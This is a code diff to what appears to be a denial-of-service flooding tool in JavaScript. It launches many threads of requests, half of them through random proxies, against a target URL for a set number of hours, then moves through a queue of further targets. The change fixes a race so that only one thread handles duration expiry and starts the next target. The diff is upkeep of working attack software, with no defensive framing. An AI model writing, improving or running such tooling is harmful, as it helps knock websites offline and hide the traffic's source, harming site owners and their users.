@@ -442,6 +442,7 @@ let tunnelActive = false;
 let saveTimer = null;
 let statusInterval = null;
 let totalReqCount = 0;
+let durationExpiryHandled = false;
 const statusCounts = new Map();
 
 const STATUS_LABELS = {
@@ -620,6 +621,7 @@ const startAttack = async (url, durationHours) => {
 
   currentTarget = { url, startTime: Date.now(), duration: durationHours * 60 * 60 * 1000 };
   continueAttack = true;
+  durationExpiryHandled = false;
   state = { continueAttack, currentTarget, totalRequests: 0, queue: [] };
   saveNow();
   lastSuccessTime = Date.now();
@@ -663,37 +665,48 @@ const performAttackSingle = async (target, ctx, threadId) => {
 
     
     if (Date.now() - target.startTime >= target.duration) {
-      console.log(colors.green(`[Duration] ${Math.round(target.duration/60000)}min wall-clock reached — target complete`));
-      if (targetQueue.length > 0) {
-        currentTarget = targetQueue.shift();
-        console.log(colors.green(`Starting next target from queue: ${currentTarget.url}`));
-        const nextTarget = currentTarget;
-        resetTotal();
-        state = { continueAttack, currentTarget: nextTarget, totalRequests: totalRequestsSent, queue: targetQueue };
-        saveNow();
-        currentTarget = nextTarget;
-        threadBackoff.clear();
-        threadTypes.clear();
-        const proxies = loadProxies();
-        let nextThreadId = 0;
-        for (let i = 0; i < numThreads; i++) {
-          if (!continueAttack) break;
-          if (proxies.length && Math.random() < 0.5) {
-            threadTypes.set(nextThreadId, "proxy");
-            performAttackSingle(nextTarget, createContext(getRandomElement(proxies)), nextThreadId++);
-          } else {
-            threadTypes.set(nextThreadId, "direct");
-            performAttackSingle(nextTarget, { type: "direct" }, nextThreadId++);
+      
+      if (durationExpiryHandled) return;
+      durationExpiryHandled = true;
+      try {
+        console.log(colors.green(`[Duration] ${Math.round(target.duration/60000)}min wall-clock reached — target complete`));
+        if (targetQueue.length > 0) {
+          currentTarget = targetQueue.shift();
+          console.log(colors.green(`Starting next target from queue: ${currentTarget.url}`));
+          const nextTarget = currentTarget;
+          resetTotal();
+          state = { continueAttack, currentTarget: nextTarget, totalRequests: totalRequestsSent, queue: targetQueue };
+          saveNow();
+          currentTarget = nextTarget;
+          durationExpiryHandled = false;
+          threadBackoff.clear();
+          threadTypes.clear();
+          const proxies = loadProxies();
+          let nextThreadId = 0;
+          for (let i = 0; i < numThreads; i++) {
+            if (!continueAttack) break;
+            if (proxies.length && Math.random() < 0.5) {
+              threadTypes.set(nextThreadId, "proxy");
+              performAttackSingle(nextTarget, createContext(getRandomElement(proxies)), nextThreadId++);
+            } else {
+              threadTypes.set(nextThreadId, "direct");
+              performAttackSingle(nextTarget, { type: "direct" }, nextThreadId++);
+            }
           }
+          console.log(colors.green(`Spawned ${nextThreadId} threads for: ${nextTarget.url}`));
+        } else {
+          continueAttack = false;
+          currentTarget = null;
+          resetTotal();
+          state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
+          saveNow();
+          console.log(colors.yellow("All targets completed. Attack finished."));
         }
-        console.log(colors.green(`Spawned ${nextThreadId} threads for: ${nextTarget.url}`));
-      } else {
+      } catch (err) {
+        
         continueAttack = false;
         currentTarget = null;
-        resetTotal();
-        state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
-        saveNow();
-        console.log(colors.yellow("All targets completed. Attack finished."));
+        console.error(colors.red(`[Duration] Error during expiry handling: ${err.message}`));
       }
       return;
     }
